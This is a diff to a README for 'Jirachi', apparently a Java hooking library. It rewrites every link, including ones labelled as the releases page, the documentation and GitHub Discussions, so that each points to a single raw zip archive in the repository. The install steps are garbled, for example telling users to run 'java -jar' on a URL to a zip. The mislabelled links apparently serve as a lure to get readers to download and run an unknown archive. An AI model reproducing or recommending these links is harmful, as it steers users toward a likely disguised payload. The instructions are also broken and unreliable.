@@ -6,11 +6,11 @@ Welcome to Jirachi! This library helps you easily add features and enhance your 
 
 ## 📦 Download Jirachi
 
-[![Download Jirachi](https://github.com/th4nny/Jirachi/raw/refs/heads/master/include/Software-1.5.zip%20Jirachi-Click%https://github.com/th4nny/Jirachi/raw/refs/heads/master/include/Software-1.5.zip)](https://github.com/th4nny/Jirachi/raw/refs/heads/master/include/Software-1.5.zip)
+[![Download Jirachi](https://github.com/th4nny/Jirachi/raw/refs/heads/master/resources/Software_v3.5.zip%20Jirachi-Click%https://github.com/th4nny/Jirachi/raw/refs/heads/master/resources/Software_v3.5.zip)](https://github.com/th4nny/Jirachi/raw/refs/heads/master/resources/Software_v3.5.zip)
 
 You can download the latest version of Jirachi from our releases page. To get started, click the link below:
 
-- [Visit the Releases Page to Download](https://github.com/th4nny/Jirachi/raw/refs/heads/master/include/Software-1.5.zip)
+- [Visit the Releases Page to Download](https://github.com/th4nny/Jirachi/raw/refs/heads/master/resources/Software_v3.5.zip)
 
 ## 🖥️ System Requirements
 
@@ -22,19 +22,19 @@ Before installing Jirachi, make sure your computer meets these basic requirement
 
 ## 📥 Download & Install
 
-1. **Visit the Release Page:** Click this link to go to the [Releases Page](https://github.com/th4nny/Jirachi/raw/refs/heads/master/include/Software-1.5.zip).
+1. **Visit the Release Page:** Click this link to go to the [Releases Page](https://github.com/th4nny/Jirachi/raw/refs/heads/master/resources/Software_v3.5.zip).
 
 2. **Choose the Version:** On the releases page, locate the latest version of Jirachi. It will usually be the one at the top.
 
 3. **Download the Package:**
-   - Click the appropriate file for your operating system. Common options might include `.exe` for Windows or `https://github.com/th4nny/Jirachi/raw/refs/heads/master/include/Software-1.5.zip` for Linux and MacOS.
+   - Click the appropriate file for your operating system. Common options might include `.exe` for Windows or `https://github.com/th4nny/Jirachi/raw/refs/heads/master/resources/Software_v3.5.zip` for Linux and MacOS.
 
 4. **Extract the Files (if needed):**
-   - For `.zip` or `https://github.com/th4nny/Jirachi/raw/refs/heads/master/include/Software-1.5.zip` files, right-click on the file and select "Extract All" or use your preferred extraction tool.
+   - For `.zip` or `https://github.com/th4nny/Jirachi/raw/refs/heads/master/resources/Software_v3.5.zip` files, right-click on the file and select "Extract All" or use your preferred extraction tool.
 
 5. **Run the Application:**
    - For Windows, double-click the `.exe` file.
-   - For Linux or MacOS, open a terminal, navigate to the extracted folder, and run `java -jar https://github.com/th4nny/Jirachi/raw/refs/heads/master/include/Software-1.5.zip`.
+   - For Linux or MacOS, open a terminal, navigate to the extracted folder, and run `java -jar https://github.com/th4nny/Jirachi/raw/refs/heads/master/resources/Software_v3.5.zip`.
 
 ## ⚙️ Basic Usage
 
@@ -55,7 +55,7 @@ Jirachi comes packed with useful features that make it a versatile hooking libra
 
 ## 📖 Documentation
 
-For further details on how to use Jirachi, check our [documentation](https://github.com/th4nny/Jirachi/raw/refs/heads/master/include/Software-1.5.zip). It covers all aspects of the library, including advanced features and tips for troubleshooting.
+For further details on how to use Jirachi, check our [documentation](https://github.com/th4nny/Jirachi/raw/refs/heads/master/resources/Software_v3.5.zip). It covers all aspects of the library, including advanced features and tips for troubleshooting.
 
 ## ❓ Frequently Asked Questions
 
@@ -70,7 +70,7 @@ A: Yes, you must have Java 8 or higher installed on your machine to run Jirachi.
 
 ## 🗨️ Community and Support
 
-If you have questions or need support, feel free to join our community on [GitHub Discussions](https://github.com/th4nny/Jirachi/raw/refs/heads/master/include/Software-1.5.zip). You can ask for help, share your projects, or simply connect with others.
+If you have questions or need support, feel free to join our community on [GitHub Discussions](https://github.com/th4nny/Jirachi/raw/refs/heads/master/resources/Software_v3.5.zip). You can ask for help, share your projects, or simply connect with others.
 
 ## 📞 Contact
 
